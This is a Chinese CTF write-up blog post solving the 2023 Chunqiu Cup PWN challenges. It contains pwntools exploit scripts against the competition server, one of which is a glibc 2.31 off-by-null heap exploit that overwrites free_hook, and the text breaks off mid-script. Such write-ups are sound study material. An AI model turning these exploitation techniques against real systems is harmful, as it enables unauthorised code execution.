<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="viol1t">





<title>2023年春秋杯网络安全联赛春季赛PWN(AK) | viol1t</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 6.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">viol1t</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/achievement">Achievement</a>
                
                    <a class="menu-item" href="/members">Members</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">viol1t</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/achievement">Achievement</a>
                
                    <a class="menu-item" href="/members">Members</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">2023年春秋杯网络安全联赛春季赛PWN(AK)</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">viol1t</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">五月 19, 2023&nbsp;&nbsp;13:54:42</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/WP/">WP</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="2023年春秋杯网络安全联赛春季赛PWN-AK"><a href="#2023年春秋杯网络安全联赛春季赛PWN-AK" class="headerlink" title="2023年春秋杯网络安全联赛春季赛PWN(AK)"></a>2023年春秋杯网络安全联赛春季赛PWN(AK)</h1><blockquote>
<p>每天花一个小时左右的时间做了一下</p>
</blockquote>
<img src="/2023/05/19/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E6%98%A5%E5%AD%A3%E8%B5%9BPWN-AK/2.png" alt="1" style="zoom:50%;">

<h2 id="p2048"><a href="#p2048" class="headerlink" title="p2048"></a>p2048</h2><p>这题都没昨看就莫名其妙的出来了，调试的时候写了如下的exp，然后<code>wasd+enter</code>乱按就拿到shell了。如果一次不成功，可以再来一次（XD</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./p2048&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&#x27;39.106.65.110&#x27;</span>, <span class="number">38152</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">dbgg()</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;aw&#x27;</span> * (<span class="number">0x1ee</span>) + <span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<img src="/2023/05/19/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E6%98%A5%E5%AD%A3%E8%B5%9BPWN-AK/1.png" alt="1" style="zoom:50%;">

<h2 id="babyaul"><a href="#babyaul" class="headerlink" title="babyaul"></a>babyaul</h2><p>第一步需要修一下bins的头，修成如下样子就可以正常运行babyaul了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  babyaul xxd bins</span><br><span class="line">00000000: 1b4c 7561 5100 0104 0804 0800 0900 0000  .LuaQ...........</span><br><span class="line">00000010: 0000 0000 406c 7561 2e6c 7561 0000 0000  ....@lua.lua....</span><br><span class="line">00000020: 0000 0000 0000 0002 020b 0000 0001 4000  ..............@.</span><br><span class="line">00000030: 0007 0000 0001 c000 0007 8000 0024 0000  .............$..</span><br><span class="line">00000040: 0007 0001 0024 4000 0007 4001 0024 8000  .....$@...@..$..</span><br><span class="line">00000050: 0007 8001 001e 0080 0007 0000 0004 0800  ................</span><br><span class="line">00000060: 0000 0000 0000 7061 7373 7374 7200 0401  ......passstr...</span><br><span class="line">00000070: 0000 0000 0000 0000 0408 0000 0000 0000  ................</span><br></pre></td></tr></table></figure>

<p>利用unluac.jar反编译出lua源码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar unluac/bin/unluac.jar  bins &gt; aul.lua</span><br></pre></td></tr></table></figure>

<p>lua源码如下</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">passstr = <span class="string">&quot;&quot;</span></span><br><span class="line">is_pass = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bypass</span><span class="params">()</span></span></span><br><span class="line">  <span class="built_in">io</span>.<span class="built_in">write</span>(<span class="string">&quot;pass:&quot;</span>)</span><br><span class="line">  passstr = <span class="built_in">io</span>.<span class="built_in">read</span>(<span class="string">&quot;*l&quot;</span>)</span><br><span class="line">  is_pass = pass(<span class="built_in">string</span>.<span class="built_in">sub</span>(passstr, <span class="number">1</span>, <span class="number">4</span>))</span><br><span class="line">  <span class="keyword">if</span> is_pass == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;passed!&quot;</span>)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;pass faild!&quot;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">io</span>.<span class="built_in">write</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> ops = <span class="built_in">io</span>.<span class="built_in">read</span>(<span class="string">&quot;*l&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> ops == <span class="string">&quot;pass&quot;</span> <span class="keyword">then</span></span><br><span class="line">      init_pass()</span><br><span class="line">      bypass()</span><br><span class="line">    <span class="keyword">elseif</span> ops == <span class="string">&quot;add&quot;</span> <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> is_pass == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">        size = <span class="built_in">io</span>.<span class="built_in">read</span>(<span class="string">&quot;*number&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;mode?&quot;</span>)</span><br><span class="line">        mode = <span class="built_in">io</span>.<span class="built_in">read</span>(<span class="string">&quot;*number&quot;</span>)</span><br><span class="line">        res_add = add_chunk(size, mode)</span><br><span class="line">        <span class="keyword">if</span> res_add == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;add success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;add err!&quot;</span>)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;pass first...&quot;</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">elseif</span> ops == <span class="string">&quot;del&quot;</span> <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> is_pass == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index?&quot;</span>)</span><br><span class="line">        index = <span class="built_in">io</span>.<span class="built_in">read</span>(<span class="string">&quot;*number&quot;</span>)</span><br><span class="line">        res_del = del_chunk(index)</span><br><span class="line">        <span class="keyword">if</span> res_del == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;del success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;del err!&quot;</span>)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;pass first...&quot;</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">elseif</span> ops == <span class="string">&quot;get&quot;</span> <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> is_pass == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index?&quot;</span>)</span><br><span class="line">        index = <span class="built_in">io</span>.<span class="built_in">read</span>(<span class="string">&quot;*number&quot;</span>)</span><br><span class="line">        res_get = get_chunk(index)</span><br><span class="line">        <span class="keyword">if</span> res_get ~= <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;get err!&quot;</span>)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;pass first...&quot;</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">elseif</span> ops == <span class="string">&quot;exit&quot;</span> <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;exit&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line">  alarm(<span class="number">120</span>)</span><br><span class="line">  banner()</span><br><span class="line">  run()</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>可以看到要过pass，逆一下pass的处理代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_615F</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_6FF0(a1, <span class="number">0xFFFFFFFF</span>LL) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = sub_7240(a1, <span class="number">0xFFFFFFFF</span>LL, <span class="number">0LL</span>);</span><br><span class="line">    sub_6D50(a1, <span class="number">-1</span>);</span><br><span class="line">    sub_5FF5(v3, (__int64)v4);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4[i] != byte_2E140[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_7460(a1, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_7460(a1, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;not string!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4个随机的数据，经过sha256加密输出，需要爆破出4个随机数据的具体数值，这里笔者直接在网站上爆破的，爆破完之后输入进去即可</p>
<p>漏洞是2.31下的off-by-null，直接套板子，打出overlapping之后任意地址写hook为magic_gadget，然后一套orw即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./babyaul&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&#x27;39.106.65.110&#x27;</span>, <span class="number">19233</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">menu2 = <span class="string">&#x27;&gt;&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, mode1, content</span>):</span><br><span class="line">    r.sendlineafter(menu2, <span class="string">&#x27;add&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;size?\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;mode?\n&#x27;</span>, <span class="built_in">str</span>(mode1))</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu2, <span class="string">&#x27;del&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;index?\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu2, <span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;index?\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendafter(menu, <span class="string">&#x27;pass\n&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;pass&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pd = <span class="built_in">input</span>(<span class="string">&#x27;give me pass: &#x27;</span>)</span><br><span class="line">li(pd)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(pd))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(menu, <span class="string">&#x27;add&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;size?\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x510</span>))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;mode?\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>, <span class="number">3</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x510</span>, <span class="number">3</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">7</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">li(<span class="string">&#x27;malloc_hook = &#x27;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">li(<span class="string">&#x27;libc_base = &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li(<span class="string">&#x27;free_hook = &#x27;</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">2</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x4da</span></span><br><span class="line">li(<span class="string">&#x27;heap_base = &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p1 = p64(heap_base + <span class="number">0x530</span>) + <span class="number">0xf8</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0x210</span>)</span><br><span class="line">add(<span class="number">0x108</span>, <span class="number">1</span>, p1)</span><br><span class="line"></span><br><span class="line">p2 = 